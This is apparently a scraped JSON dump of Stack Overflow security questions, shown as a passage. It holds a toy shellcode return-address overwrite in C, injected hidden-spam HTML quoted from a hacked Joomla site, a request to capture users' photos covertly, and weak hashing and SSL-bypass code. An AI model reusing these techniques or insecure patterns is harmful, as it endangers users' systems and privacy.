Additionally, I am dealing with JSP; when using JSP or a similar framework, would it be fair to say the best practice is to avoid placing sensitive data in the POST or GET altogether and using server side code to handle sensitive information instead?</p>\n"},{"tags":["c#","asp.net","security","session"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12969213,"title":"Does storing the username in the session['user'] safe? c# asp.net","body":"<p>I have the following code in my web application asp.net using C#:</p>\n\n<pre><code>            bool isValid = pc.ValidateCredentials(username.Text, password.Text);\n            if (isValid == true)\n            {\n                Session[\"user\"] = username.Text;\n            }\n</code></pre>\n\n<p>The <code>username</code> is actually a textbox. The end-user will key in their username and password, which will authenticate against a AD (Active Directory) server using the <code>PrincipalContext pc</code>.</p>\n\n<p>So, I was wondering if it is safe or are there improvement to be make for the above code so that it can be more secure?</p>\n"},{"tags":["java","security","applet","rdp","accesscontrolexception"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12969137,"title":"Try to access command prompt through applet in HTML","body":"<p>I have required to take remote desktop connection through browser for which I have written an signed applet and try to call through HTML but I am getting:</p>\n\n<pre><code>java.security.AccessControlException: access denied (java.io.FilePermission &lt;&lt;ALL FILES&gt;&gt; execute)\nat java.security.AccessControlContext.checkPermission(AccessControlContext.java:374)\nat java.security.AccessController.checkPermission(AccessController.java:546)\nat java.lang.SecurityManager.checkPermission(SecurityManager.java:532)\nat java.lang.SecurityManager.checkExec(SecurityManager.java:782)\nat java.lang.ProcessBuilder.start(ProcessBuilder.java:448)\nat java.lang.Runtime.exec(Runtime.java:593)\nat java.lang.Runtime.exec(Runtime.java:466)\nat AppletProgram.init(AppletProgram.java:11)\nat sun.applet.AppletPanel.run(AppletPanel.java:424)\nat java.lang.Thread.run(Thread.java:662)\n</code></pre>\n\n<p>I have added all the permission in the java.policy file but still not able to resolve the same error. How to resolve the problem? </p>\n"},{"tags":["android","security","camera","cameracapturetask"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":12968505,"title":"Android camera auto click capture...!","body":"<p>I am going to develop android camera application. In app. when user click search button, two synchronously task going to woke one is searching text which is enter by user and other is camera functionality. In this camera functionality, camera auto capture user image, and I don't want to show any camera activity to user, it's all manage from the programming level, when camera start and capture image of user at a time user show searching result or working on that searching task, how can i do..? please vote.. thanks for replying me...!</p>\n"},{"tags":["java","security","sockets"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":377,"score":1,"question_id":7326086,"title":"java socket permission problem","body":"<p>I have a need to write to a remote machine via a Socket from within an applet.   The applet resides within an intranet within a closed hospital system so changing the java security file is not an issue.    From the Oracle site, they recommend the following policy change:</p>\n\n<p>grant {\n  permission java.net.SocketPermission \n  \"10.130.71.156:8000\", \"connect,accept\";\n};</p>\n\n<p>I have done this but I am still getting the following error:</p>\n\n<pre><code>java.security.AccessControlException: access denied (java.net.SocketPermission [10.130.71.156:8000]resolve)     \n</code></pre>\n\n<p>Any ideas of what the problem could be?</p>\n"},{"tags":[".net","security","encryption","hash"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":1968,"score":1,"question_id":242648,"title":"What is the most secure hashing algorithm in the .NET framework?","body":"<p>The size of the generated hash and the speed of the algorithm are not important. I'm really only interested in it being the most secure option. I don't want to use any third party libraries either.</p>\n\n<p>The version of the .NET framework I'm using if 3.5 if that makes any difference.</p>\n"},{"tags":[".net","security","hash","passwords"],"answer_count":4,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":281,"score":4,"question_id":2121913,"title":"Is there a built in function to hash passwords in .NET?","body":"<p>I seen this question <a href=\"http://stackoverflow.com/questions/287517/encrypting-hashing-plain-text-passwords-in-database\">http://stackoverflow.com/questions/287517/encrypting-hashing-plain-text-passwords-in-database</a></p>\n\n<p>and i am aware i shouldnt do md5(\"salt\" + password); and i see an implementation in python for a solution.</p>\n\n<p>Is there a .NET built in function with params i can use instead of writing my own?</p>\n"},{"tags":["web-services","security","rest","pkcs7"],"answer_count":0,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":90,"score":5,"question_id":12966460,"title":"REST APIs and message level security","body":"<p>I need to implement message level security in a REST API and have some concerns and questions. I found the answer here: \n<a href=\"http://stackoverflow.com/questions/9869828/message-level-security-in-rest-web-services\">Message Level Security in Rest Web services</a></p>\n\n<p>only partially helpful. </p>\n\n<p>We currently support standard SSL transport security and several authentication methods including:</p>\n\n<ul>\n<li>Basic http auth (required by some network equipment services that\ntalk to our API's)</li>\n<li>HMAC with pre-shared secrete key in both SHA1 and    SHA256 flavors.</li>\n<li>Client identity certs sent @ the TLS level. </li>\n<li>SAML 2.0</li>\n</ul>\n\n<p>Why we need message level security because:</p>\n\n<ul>\n<li>Customer industries include health care, financial and government, among others, and they often frown on SSL only.</li>\n<li>Need to guarantee end to end security. Through reverse proxies, SSL accelerators, etc... </li>\n<li>Some data passed through the services will include very sensitive data. </li>\n<li>Need to have a good answer for customers that insist that SOAP's WS-* security standards are  \"Enterprise strength\" web services and REST APIs are not.</li>\n</ul>\n\n<p>My initial thought is to use an PKCS#7 envelope, as an option, if client applications understand how to process enveloped responses. </p>\n\n<p>I want client applications to tell the API that they want a secured response or tell the API that the message they are POSTing or PUTing is secured.</p>\n\n<p>My real question is, should this be communicated through a media type? E.g.:</p>\n\n<ul>\n<li>Content-Type: application/vnd.resourcetype1+json+pkcs7</li>\n<li>Content-Type: txt/csv+pkcs7</li>\n</ul>\n\n<p>i don't want to loose information on the media type that is enveloped. </p>\n\n<p>It gets complicated as in some cases the signature is enough. Others require encryption as well. The term \"pkcs7\" is vague as to how the envelope is constructed. </p>\n\n<p>I want the client and server to tell each other the type of content they are sending and the type of content they understand through standard HTTP headers.</p>\n"},{"tags":["php","mysql","security"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":66,"score":1,"question_id":12830283,"title":"MD5 + Salt giving me some strange characters","body":"<pre><code>$salt = uniqid();\n   $crypt = md5($password , $salt);\n   $new_pass = $crypt.':'.$salt;\n</code></pre>\n\n<p>In the database: <code>­ot÷„[ªà%ÛÅ‰¹:17b8bc731c322c9e05a26666458117f4</code></p>\n\n<p>Is this a syntactical error? Or is the database not set up with the correct character formatting?</p>\n"},{"tags":["java","security","rsa","cipher"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":82,"score":2,"question_id":12914814,"title":"Java security class cast exception","body":"<p>Hi I am beginner in Java security, i encounter the following issue, when calling :</p>\n\n<pre><code>Cipher cipher = Cipher.getInstance(\"RSA/ECB/PKCS1Padding\");\n</code></pre>\n\n<p>I got the error :</p>\n\n<p><code>java.lang.ClassCastException: com.sun.crypto.provider.RSACipher cannot be cast to javax.crypto.CipherSpi</code></p>\n\n<p>There are 5 more jars file for a payment gateway encryption in my war file:</p>\n\n<ul>\n<li>cryptix-jce-api.jar</li>\n<li>cryptix-jce-provider.jar</li>\n<li>cryptix-message-api.jar</li>\n<li>cryptix-openpgp-provider.jar</li>\n<li>cryptix-pki-api.jar</li>\n</ul>\n\n<p>Without these 5 JAR files then the <strong>Cipher.getInstance()</strong> works, but that is not possible because I need the JARs for payment information encryption.</p>\n\n<p>Anyone out there can show me the path of how should I overcome this issue?</p>\n"},{"tags":["php","security","joomla"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12952449,"title":"Joomla 1.5 files security problems","body":"<p>I'm hosting with 1and1 UK a Joomla 1.5.26 website. This week we've been getting hacked and I do not know how to tackle the problem. </p>\n\n<p>1and1 are COMPLETELY USELESS, answering a question like this \"How did index.php change from 644 to 200 permissions\" with this answer \"to change the file permissions, follow these steps\".. </p>\n\n<p>Anyways, the questions I'm looking to have answered is:</p>\n\n<p>What is the correct file/folder permissions setting? Is it: Folders 755 and Files 644?</p>\n\n<p>Is there a component or another way in which to \"search all files and folders and RESET the correct permissions\"?</p>\n\n<p>Is there a component or another way in which I can install additional security for both the files/folders, but also the database, to prevent these kinds of attacks?</p>\n\n<p>Many thanks for your time</p>\n"},{"tags":["php","security","hash","login","passwords"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":67,"score":1,"question_id":12964054,"title":"PHP: Password hash using various methods","body":"<p>I was looking for the best way to store the users' passwords, but I'm not really into security, so I've found a lot of information about encryption and things like that, using Google.</p>\n\n<p>I don't like using snippets that I can get in blogs or sites on the Internet, I'd rather create my own solution, so I ended up developing two functions: One to create a hash and another one to check the \"hashed\" password.</p>\n\n<p>I don't know if I'm doing right, or if I'm just increasing my problems, so take a look at the functions below. </p>\n\n<pre><code>// Creates a simple password's hash\nfunction hashPassword( $password = false )\n{\n  // Checks if the password has more than 6 characters\n  if( strlen( $password ) &lt; 6 )\n  {\n    // Kills the script\n    exit('Password is too short.');\n   }\n\n   // Split the 4 first characters of the password\n   $salt = substr( $password, 0, 4 );\n\n   // Calculate the md5 hash of the salt\n   $salt = md5( $salt );\n\n   // Get the rest of the password\n   $password =  substr( $password, 3, strlen( $password ) );\n\n   // Calculate the md5 hash of the password\n   $password = sha1( $salt . $password );\n\n   // Crypt the password\n   $password = crypt( $password );\n\n   return $password;\n}\n</code></pre>\n\n<p>That's the password that I'm going to store. Now, check out the way I'm gonna check if the password's correct.</p>\n\n<pre><code>// Checks if a hashed password match a user input password\nfunction checkHashedPassword( $password = false, $hashedPassword = false )\n{\n// Checks if the password has more than 6 characters\nif( strlen( $password ) &lt; 6 )\n{\n    // Kills the script\n    exit('Password is too short.');\n}\n\n// Split the 4 first characters of the password\n$salt = substr( $password, 0, 4 );\n\n// Calculate the md5 hash of the salt\n$salt = md5( $salt );\n\n// Get the rest of the password\n$password =  substr( $password, 3, strlen( $password ) );\n\n// Calculate the md5 hash of the password\n$password = sha1( $salt . $password );\n\n// Checks the password and hash\nif( crypt( $password, $hashedPassword ) == $hashedPassword ) \n{\n    // Returns true\n    return true;\n}\n\n// Returns false by default\nreturn false;\n}\n</code></pre>\n\n<p>As you can notice, I'm going to create a variable storing the password, and the I can check if it's ok, like the code below:</p>\n\n<pre><code>$pass = hashPassword( $_POST['password'] );\n\nif( !checkHashedPassword( $_POST['password'], $pass ) ) \n{\n    exit('Password incorrect!');\n}\n</code></pre>\n\n<p>So, will it work securely?</p>\n"},{"tags":["ios","security","restkit","finance"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12965564,"title":"Is RestKit a suitable framework for financial apps?","body":"<p>Is RestKit suitable for financial apps on iOS?</p>\n\n<p>The financial app will assist people to manage their money between accounts. It will be supporting both XML and JSON payloads.</p>\n\n<p>Will it stand up to the rigours of pen-testing?</p>\n"},{"tags":["security","ssl","heroku"],"answer_count":5,"favorite_count":1,"up_vote_count":5,"down_vote_count":6,"view_count":3058,"score":-1,"question_id":1157563,"title":"Why would anyone use Heroku (security-related)?","body":"<p>Heroku seems great, but most non-trivial applications require authentication, and conventional authentication schemes require an SSL connection, and it's impossible to get <code>https://your_app_name.com</code> (you can only get <code>https://your_app_name.heroku.com</code>).</p>\n\n<p>So if you're using Heroku, is it that:</p>\n\n<ol>\n<li>You don't mind directing users to\nanother domain (seems pretty\nbad)</li>\n<li>You don't mind foregoing\nSSL for authentication (seems really\nbad)</li>\n<li>Your app doesn't require authentication</li>\n</ol>\n\n<p><strong>Edit:</strong> In your answer, please select one of the above options.</p>\n"},{"tags":["ios","security","ssl","air","man-in-the-middle"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":12963649,"title":"Air for iOS avoiding Man in the Middle attacks","body":"<p>In Air for iOS, I'm trying to find a way to mark when a possible Man in the Middle attack has occurred.  </p>\n\n<p>By default, anytime you try to connect to an SSL site that has an invalid certificate, you get the error:</p>\n\n<blockquote>\n  <p>\"A secure connection with this site cannot be verified. Would you\n  still like to proceed?</p>\n  \n  <p>The certificate you are viewing does not match the name of the site\n  you are trying to view.\"</p>\n</blockquote>\n\n<p>I don't want to display this prompt, just disable network functions after that.</p>\n\n<p>I started off trying to use a network monitor, but it gives the prompt as does running a separate URL request to test the connection.</p>\n\n<p>I finally came across the \"SecureSocketMonitor\" which seems to do what I need it to do when running through the Flash environment, but once I compile into an Air for iOS application, it doesn't seem to function at all.</p>\n\n<p>Does anyone know how I can detect an invalid SSL certificate without displaying that prompt?</p>\n"},{"tags":["c#","java","security"],"answer_count":0,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":76,"score":2,"question_id":12963497,"title":"Is there a performance issue with SecureRandom, and if so, what can I replace it with?","body":"<p>I want to convert the following Java code to C# but I as far as I remember there were a performance problem on SecureRandom so if you have any suggestion in any kind like changing the way to get Public keys or the whole algorithm, it's appreciated !!!</p>\n\n<pre><code>public KeyPair generateKeys(String path, String username, String keyAlgorithm, int numBits){\n\n    try{\n        if (path == null)\n            return null;\n        if (!path.equals(\"./\")){\n            if (!(new File(path).exists())){\n                boolean success = (new File(path)).mkdirs();\n                if (!success)\n                    return null;\n            }\n        }\n\n\n        KeyPair keyPair = null;\n\n        // Get the public/private key pair\n        KeyPairGenerator keyGen = KeyPairGenerator.getInstance(keyAlgorithm);\n        SecureRandom random = SecureRandom.getInstance(\"SHA1PRNG\");\n        keyGen.initialize(numBits, random);\n        keyPair = keyGen.genKeyPair();\n        PrivateKey privateKey = keyPair.getPrivate();\n        PublicKey  publicKey  = keyPair.getPublic();\n        if (DEBUG){\n            System.out.println(\"DEBUG: line 77 of KeyPairUtil.java. Generating key/value pair using \" + privateKey.getAlgorithm() + \" algorithm\");\n        }\n\n        // Get the bytes of the public and private keys\n        byte[] privateKeyBytes = privateKey.getEncoded();\n        byte[] publicKeyBytes  = publicKey.getEncoded();\n\n        String privateKeyStr = new sun.misc.BASE64Encoder().encode(privateKeyBytes);\n        String publicKeyStr = new sun.misc.BASE64Encoder().encode(publicKeyBytes);\n\n\n        // Store the public and private keys in separate files\n\n        FileOutputStream pubKeyFile = new FileOutputStream(path + username + \".pub\");\n        pubKeyFile.write(publicKeyStr.getBytes(\"UTF-8\"));\n        pubKeyFile.close();\n\n        FileOutputStream priKeyFile = new FileOutputStream(path + username + \".pri\");\n        priKeyFile.write(privateKeyStr.getBytes(\"UTF-8\"));\n        pubKeyFile.close();\n\n        return keyPair;\n    }catch(NoSuchAlgorithmException e){\n        if (DEBUG){\n            e.printStackTrace();\n        }\n    }catch(FileNotFoundException e){\n        if (DEBUG){\n            e.printStackTrace();\n        }\n    }catch(IOException e){\n        if (DEBUG){\n            e.printStackTrace();\n        }\n    }\n    return null;\n}\n</code></pre>\n"},{"tags":["c#","security","microsoft-metro","web-security","winrt"],"answer_count":1,"favorite_count":3,"up_vote_count":5,"down_vote_count":1,"view_count":311,"score":4,"question_id":11955590,"title":"Accepting invalid SSL certificates using WinRT","body":"<p>There are scenarios where you want your application to accept invalid SSL certificates (testing environment/ self signed certificates etc).</p>\n\n<p>In the .NET world one would use the <code>ServerCertificateValidationCallback</code> class to do so. Unfortunately the class doesn't exist in a WinRT context.</p>\n\n<p>I need to consume a Web API using WinRT which is hosted on a server without a valid ssl certificate. </p>\n\n<p>How do you accept invalid ssl certificates in WinRT using the <code>HttpClient</code> class or any other appropriate class.</p>\n\n<p>Any help or alternatives would much appreciated.</p>\n"},{"tags":["php","security","disabled-input"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12960235,"title":"How to block some php variable from being used","body":"<p>Team i work with keep using <code>$_REQUEST</code> variable when i told them many times to not use it and instead use <code>$_POST</code> and <code>$_GET</code>. i wonder if there is way to block this variable so if they use it again code gives fatal error. Or perhaps deprecate it somehow.</p>\n\n<p>e.g. i can put <code>unset($_REQUEST);</code> in the top of my includes file but i bet they can find it and disable, i need to be able to do it on server side.</p>\n"},{"tags":["c","security","stackoverflow","buffer-overflow","shellcode"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":358,"score":2,"question_id":8488240,"title":"Execution of function pointer to Shellcode","body":"<p>I'm trying to execute this simple opcode for exit(0) call by overwriting the return address of main.\nThe problem is I'm getting segmentation fault.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nchar shellcode[]= \"/0xbb/0x14/0x00/0x00/0x00\"\n                  \"/0xb8/0x01/0x00/0x00/0x00\"\n                  \"/0xcd/0x80\";\n\nvoid main()\n{\n      int *ret;\n\n      ret = (int *)&amp;ret + 2; // +2 to get to the return address on the stack\n\n      (*ret) = (int)shellcode;   \n\n}\n</code></pre>\n\n<p>Execution result in Segmentation error.</p>\n\n<pre><code>[user1@fedo BOF]$ gcc -o ExitShellCode ExitShellCode.c\n\n[user1@fedo BOF]$ ./ExitShellCode\n\nSegmentation fault (core dumped)\n</code></pre>\n\n<p>This is the Objdump of the shellcode.a</p>\n\n<pre><code>[user1@fedo BOF]$ objdump -d exitShellcodeaAss\n\nexitShellcodeaAss:     file format elf32-i386\n\n\nDisassembly of section .text:\n\n08048054 &lt;_start&gt;:\n 8048054:       bb 14 00 00 00          mov    $0x14,%ebx\n 8048059:       b8 01 00 00 00          mov    $0x1,%eax\n 804805e:       cd 80                   int    $0x80\n</code></pre>\n\n<p>System I'm using</p>\n\n<pre><code>fedora Linux 3.1.2-1.fc16.i686 \nASLR is disabled.\nDebugging with GDB.\ngcc version 4.6.2\n</code></pre>\n"},{"tags":["security","encryption","aes"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":325,"score":0,"question_id":4874454,"title":"Tips on encryption for storage at rest (AES, SHA??)","body":"<p>I wanted to know what is the best way to encrypt storage at rest.  Lets say financial information for 1000 users is on a system.  Besides making sure nobody unauthorized gets to how do we encrypt the data that is being used everyday so that if god forbid they get it, it should be impossible for them to decode or read?  </p>\n\n<p>I believe AES is a correct measure?? How can i implement AES using PHP for phpmyadmin data?</p>\n"},{"tags":["security","joomla"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":149,"score":2,"question_id":12960852,"title":"Joomla hacked. How to prevent?","body":"<p>Ok, so one of my websites ( on joomla) is being hacked like, 6th time...</p>\n\n<p>Honestly, i can't take it anymore...\nI feel the stupidest man in the world. I don't know what to do...</p>\n\n<p>Ok, i won't tell you any stories. Only facts:</p>\n\n<p>Firstly i found, that in template index file appeared some code:</p>\n\n<pre><code>&lt;div id='hideMe'&gt; &lt;p&gt;Every person knows the large quan...|...ur cure Viagra &lt;a href=\"xxxxx\"&gt;Viagra&lt;/a&gt; &lt;/div&gt;&lt;script type='text/javascript'&gt;if(document.getElementById('hideMe') != null){document.getElementById('hideMe').style.visibility = 'hidden';document.getElementById('hideMe').style.display = 'none';}&lt;/script&gt;\n</code></pre>\n\n<p>Then i found in tmp folder file named asd.php</p>\n\n<p>with content:\n<a href=\"http://www.codr.cc/bb027a\" rel=\"nofollow\">http://www.codr.cc/bb027a</a></p>\n\n<p>i tried to decode what was in there and got something like:\n<a href=\"http://www.codr.cc/97c183\" rel=\"nofollow\">http://www.codr.cc/97c183</a></p>\n\n<p>How this happened? How hacker got access to create a file? All folders perms are 755 and files - 644.</p>\n\n<p>Joomla doesn't have any unsafe modules, components or templates. \nEverything is up to date.</p>\n\n<p>What else should i do to stop this man from playing with me...</p>\n"},{"tags":["security","oauth-2.0"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12957775,"title":"What's \"Code substitution (OAuth Login)\" threat?","body":"<p>From the <a href=\"http://tools.ietf.org/html/draft-ietf-oauth-v2-threatmodel-08#section-4.4.1.13\" rel=\"nofollow\"><strong>OAuth 2.0 Threat Model and Security Considerations</strong> draft</a>:</p>\n\n<blockquote>\n  <p><strong>4.4.1.13.  Threat: Code substitution (OAuth Login)</strong></p>\n  \n  <p>An attacker could attempt to login to an application or web site\n    using a victim's identity.  Applications relying on identity data\n    provided by an OAuth protected service API to login users are\n    vulnerable to this threat.  This pattern can be found in so-called\n    \"social login\" scenarios.</p>\n  \n  <p>As a pre-requisite, a resource server offers an API to obtain\n    personal information about a user which could be interpreted as\n    having obtained a user identity.  In this sense the client is\n    treating the resource server API as an \"identity\" API.  A client\n    utilizes OAuth to obtain an access token for the identity API.  It\n    then queries the identity API for an identifier and uses it to look\n    up its internal user account data (login).  The client asssumes that\n    because it was able to obtain information about the user, that the\n    user has been authenticated.</p>\n  \n  <p>If the client uses the grant type \"code\", the attacker needs to\n    gather a valid authorization code of the respective victim from the\n    same identity provider used by the target client application.  The\n    attacker tricks the victim into login into a malicious app (which may\n    appear to be legitimate to the Identity Provider) using the same\n    identity provider as the target application.  This results in the\n    Identity Provider's authorization server issuing an authorization\n    code for the respective identity API.  The malicious app then sends\n    this code to the attacker, which in turn triggers a login process\n    within the target application.  The attacker now manipulates the\n    authorization response and substitutes their code (bound to their\n    identity) for the victim's code.  This code is then exchanged by the\n    client for an access token, which in turn is accepted by the identity\n    API since the audience, with respect to the resource server, is\n    correct.  But since the identifier returned by the identity API is\n    determined by the identity in the access token (issued based on the\n    victim's code), the attacker is logged into the target application\n    under the victim's identity.</p>\n  \n  <p>Impact: the attacker gains access to an application and user-specific\n    data within the application.</p>\n  \n  <p>Countermeasures:</p>\n  \n  <ul>\n  <li><p>All clients must indicate their client id with every request to\n   exchange an authorization code for an access token.  The\n   authorization server must validate whether the particular\n   authorization code has been issued to the particular client.  If\n   possible, the client shall be authenticated beforehand.</p></li>\n  <li><p>Clients should use appropriate protocol, such as OpenID (cf.\n   [openid]) or SAML (cf. [OASIS.sstc-saml-bindings-1.1]) to\n   implement user login.  Both support audience restrictions on\n   clients.</p></li>\n  </ul>\n</blockquote>\n\n<p>This is rather confusing to me: «the attacker needs to gather a valid authorization code of the respective victim from the same identity provider used by the target client application». What's \"the respective victim\" and what does \"identity provider\" mean in this and subsequent uses?</p>\n\n<p>The whole attack description is obscure. I came to understand it as \"one shouldn't use OAuth 2.0 to implement user login\", but wouldn't that mean that major platforms such as Facebook are vulnerable? And vulnerable to what, exactly?</p>\n\n<p>I probably only need a clarification of some of the terms used in this paragraph.</p>\n"},{"tags":["php","security"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12959526,"title":"Non-registration submission, security concern","body":"<p>I've created a simple script that allows a user to post a message, question or discussion on my site. I've not got anything online yet so I can't show you, but one thing I don't want is registration.</p>\n\n<p>I want a simple, streamlined and quick way for anybody to come on to my site and post a message, to which others can respond (also without registration).</p>\n\n<p>My question is about security. I've made it so that a person may edit their own message only if the following conditions are met:</p>\n\n<ol>\n<li>The IP address <code>($_SERVER['REMOTE_ADDR'])</code> matches the one used to ask the question (I store it in the database).</li>\n<li>No more than 20 minutes have elapsed.</li>\n</ol>\n\n<p>I want to know how easy this would be to break, and how I can make it stronger. I'm an absolute newby when it comes to security and I'll state now I have no real interest in this side of development, I'm more of a client/server developer, but my strong point is JavaScript. </p>\n\n<p>I'm not too clued up on networking either. How easy is it to spoof an IP address and also how common is it to find two users with identical addresses? I am thinking about making a session ID which will be stored in a temporary database as a third clause that must exist in order for edits to take place. Of course this means users will not be able to leave the site and come back to edit.</p>\n\n<p>Could anyone give me some advice on the best way to proceed?</p>\n\n<p>Note: I want to make it clear that I absolutely do not want registration, which would eliminate this problem entirely. I want a free to use, public site that anyone can simply come along and use. </p>\n\n<p>Note 2: I've also taken care of the bot problem with a simple piece of JavaScript requiring the user to interact with the site (quicker than CAPTCHA), so no worries here.</p>\n\n<p>Kind regards.</p>\n"},{"tags":["android","security","android-intent","settings","uri"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12959184,"title":"Android Intent URI to Open Security Settings Page","body":"<p>I would like to have a link in a webpage that would take the user directly to the security settings page. I know that using Intent URIs, several intents can be invoked (e.g. dialler using \"tel:\"). I was wondering if anyone knows about a URI that would open the security settings page.\nIf not, then is there a way to do it using JavaScript?</p>\n"},{"tags":["java","security","glassfish","jersey"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":12957686,"title":"Authentification using a user id stored in the session - security risk / bad practice?","body":"<p>I am developing a small REST-webservice for non critical data which will mainly be accessed by a smartphone application. For limiting the access of the users to their individual data (the authorization does not need groups or roles), I need to implement some sort of basic authentification.</p>\n\n<p>As the service will be accessed over HTTP, using HTTP-Authentification seems to be no good idea as the username and password will be sent in cleartext on every request and need to be stored on the client device.</p>\n\n<p>Thus, my idea was to implement authentification the following way:</p>\n\n<ol>\n<li>The user logs on using a login method of my webservice passing their username / password</li>\n<li>This method checks the validity of the username / password combination (based on a database containing salted and hashed passwords)</li>\n<li>If the login is successful, the id of the user (primary key of the database table) is stored in the session as an attribute</li>\n<li>In the following requests, this attribute is used to authentificate the user</li>\n</ol>\n\n<p>In code, my login method would look like the following:</p>\n\n<pre><code>User user = this.authentificate(username, password);\nHttpSession session = request.getSession(true);\nif (user != null)\n   session.setAttribute(\"UserId\", user.getId());\nelse\n   session.invalidate();\n</code></pre>\n\n<p>Afterwards, I would be able to authentificate the user based on the session:</p>\n\n<pre><code>int userId = (int) request.getSession().getAttribute(\"UserId\");\nUser currentUser = getUserById(userId);\n</code></pre>\n\n<p>Can this approach be considered as \"secure\" (no easy session highjacking possible - as far as I understood <a href=\"http://stackoverflow.com/a/5838191/232175\">http://stackoverflow.com/a/5838191/232175</a> , the attributes' values won't leave the server)?<br>\nAre there any downsides or alternatives?</p>\n"},{"tags":["security","encryption","pci-dss"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12950397,"title":"How to encrypt database connection credentials on a web server?","body":"<p>OWASP advise against storing DB credentials in plain text: </p>\n\n<p><a href=\"https://www.owasp.org/index.php/Password_in_Configuration_File\" rel=\"nofollow\">https://www.owasp.org/index.php/Password_in_Configuration_File</a></p>\n\n<p>However, they don't provide suggestions of how to encrypt the DB access credentials, where to store keys, how to manage access to keys, etc. </p>\n\n<p>Has anyone any real-world experience of implementing such a solution who can suggest an architecture on a LAMP stack?</p>\n\n<p>PS - I'm not looking for answers along the lines of \"don't bother - if someone gains root access it's too late\", etc.</p>\n"},{"tags":["java","security","awt","clipboard"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12950381,"title":"system clipboard only inside an application","body":"<p>I have a swing application and I want to copy some text to the system clipboard. I do this with</p>\n\n<pre><code>Clipboard systemClipboard = Toolkit.getDefaultToolkit().getSystemClipboard();\nStringSelection dataToClipboard = new StringSelection(stringToCopy);\nsystemClipboard.setContents(dataToClipboard, null);\n</code></pre>\n\n<p>But it exists only inside the app, I can paste it in any text field in it, but when I try to do so in a web browser, it pastes nothing.</p>\n\n<p>I also tried to implement ClipboardOwner interface and pass it's reference instead of <code>null</code>, but it didn't make a difference.</p>\n"},{"tags":[".net","security","authentication","asp.net-mvc-4","asp.net-web-api"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12944880,"title":"web api authentication for 3rd parties and javascript","body":"<p>I am currently implementing web api in my mvc4 application and have a question around authenticating the caller of the web api service.</p>\n\n<p>In my web application, web api will be used for 2 different reasons. Firstly, for my javascript communicate to the server, secondly for third party components communicating with my application.</p>\n\n<p>Because of this, I would like to authenticate the caller of the service. Passing a username and password in the header for either caller is straight forward but the header can be sniffed by illegitimates. If I make the services https, this will prevent against this, but it causes performance issues for my js to be calling it in rich application.</p>\n\n<p>I have looked at examples on the web for this, but cant find a solution as of yet that covers off both of mt scenarios and secures my services. I am interested to hear suggestions as how to solve this problem? For example, how do existing companies secure their services ie twitter. I want to secure my services, to allowable third parties and my javascript. Please educate me!</p>\n"},{"tags":["security","authentication","login","passwords"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":12946186,"title":"User accounts with no password but emails a login link every time user tries to log in?","body":"<p>I'm thinking of building a user login system for my website in this manner. Users are authenticated by clicking the link sent to his or her email every time he or she needs to log in.</p>\n\n<p>Not sure if anyone has done this before but I'd want to know if this is actually a POSITIVE user experience or a NEGATIVE one?</p>\n\n<p>Off the top of my head, I think this is a positive one because:</p>\n\n<ol>\n<li>User would only need to supply his or her email address to register, thus registration is much easier. (POSITIVE)</li>\n<li>No password or whatsoever stored in website database, which is easier for developers and harder for hackers. (POSITIVE)</li>\n<li>This system makes sure the user is the legal owner of the email (rather than someone who knows / guesses the password). (POSITIVE)</li>\n<li>System needs to be secured in sending out the emails, thus more work for developers / sys admins. (NEGATIVE)</li>\n<li>Emails could be delayed for one reason or another, even 10 seconds would very probably make the user frustrated and eventually give up. (BIG NEGATIVE)</li>\n</ol>\n\n<p>Is this really applicable? Anyone has any first hand experience on this please? Thanks!</p>\n"},{"tags":["wcf","security","rest","authorization"],"answer_count":9,"favorite_count":214,"up_vote_count":232,"down_vote_count":0,"view_count":73706,"score":232,"question_id":7551,"title":"Best Practices for securing a REST API / web service","body":"<p>When designing a REST API or service are there any established best practices for dealing with security (Authentication, Authorization, Identity Management) ?</p>\n\n<p>When building a SOAP API you have WS-Security as a guide and much literature exists on the topic. I have found less information about securing REST endpoints.</p>\n\n<p>While I understand REST intentionally does not have specifications analogous to WS-* I am hoping best practices or recommended patterns have emerged.</p>\n\n<p>Any discussion or links to relevant documents would be very much appreciated.\nIf it matters, we would be using WCF with POX/JSON serialized messages for our REST API's/Services built using v3.5 of the .NET 